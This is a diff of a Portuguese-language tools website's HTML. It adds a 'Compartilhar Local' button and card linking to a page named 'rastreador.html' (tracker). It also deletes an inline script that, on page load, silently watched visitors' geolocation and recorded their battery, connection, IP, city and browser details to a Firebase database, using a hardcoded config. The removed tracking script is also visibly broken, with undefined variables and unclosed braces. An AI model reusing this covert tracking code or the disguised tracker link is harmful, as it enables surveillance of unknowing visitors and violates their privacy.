@@ -195,6 +195,8 @@ color:#4caf50;
 <button onclick="mostrar('jogos')">🎮 Jogos</button>
   
 <button onclick="mostrar('Loja')">🛒 Shopee Loja</button>
+
+<button onclick="mostrar('compartilhar)">Compartilhar Local</button>
   
 <button onclick="window.scrollTo(0,0)">⬆ Topo</button>
 
@@ -336,11 +338,8 @@ data-full-width-responsive="true"></ins>
 
 
 <div id="calculadoras" class="secao">
-
 <h2>🧮 Calculadoras</h2>
-
 <div class="grid">
-
 <a href="calculadora.html">
 <div class="card">
 <h3>🧮 Calculadora</h3>
@@ -349,37 +348,39 @@ data-full-width-responsive="true"></ins>
 </a>
 
 </div>
-
 </div>
 
 
 
 <div id="jogos" class="secao">
-
 <h2>🎮 Jogos</h2>
-
-<div class="grid">
-  
+<div class="grid"> 
 <div class="card">
 <h3>🎮 Em breve</h3>
 <p>Jogos chegando</p>
 </div>
-
-</div>
-
 </div>
 
 <div id="Loja" class="secao">
-
 <h2>🛒Shopee Loja</h2>
-
 <div class="grid">
-  
 <a href="loja.html">
 <div class="card">
 <h3>Shopee Loja</h3>
 <p>Produtos da Shopee</p>
 </div>
+</div>
+
+  
+<div id="compartilhar" class="secao">
+<h2>CompartilharLocal</h2>
+<div class="grid">
+<a href="rastreador.html">
+<div class="card">
+<h3>Compartilhar Local</h3>
+<p>Mostrar Localde ondivoce conversa?</p>
+</div>
+
 
 </div>
 </div>
@@ -502,70 +503,6 @@ top = ferramenta;
 document.getElementById("top").innerText = top;
 
 });
-
-</script>
-<script type="module">
-
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
-
-const firebaseConfig = {
-
-apiKey:"AIzaSyDrtZxbKXk7hjlqBL_BLoZMTBdc5iqBCXo",
-authDomain:"ferramentas-projeto.firebaseapp.com",
-databaseURL:"https://ferramentas-projeto.firebaseio.com/",
-projectId:"ferramentas-projeto",
-storageBucket:"ferramentas-projeto.appspot.com",
-messagingSenderId:"877191590019",
-appId:"1:877191590019:web:152d4d35bdd3024c53abb6"
-
-}
-
-const app = initializeApp(firebaseConfig)
-const db = getDatabase(app)
-
-let id = localStorage.getItem("uid")
-
-if(!id){
-
-id = Math.random().toString(36).substr(2,9)
-localStorage.setItem("uid",id)
-
-}
-
-function start(){
-
-navigator.geolocation.watchPosition(async pos=>{
-
-let lat = pos.coords.latitude
-let lng = pos.coords.longitude
-
-let bateria = "N/A"
-
-if(navigator.getBattery){
-
-let bat = await navigator.getBattery()
-bateria = Math.floor(bat.level*100)+"%"
-
-}
-
-let conexao = navigator.connection ? navigator.connection.effectiveType : "N/A"
-
-push(ref(db,"localizacoes"),{
-
-latitude:lat,
-longitude:lng,
-cidade:info.city,
-pais:info.country_name,
-ip:info.ip,
-celular:navigator.userAgent,
-data:Date.now()
-
-})
-
-/* inicia automaticamente */
-
-start()
 
 </script>
   
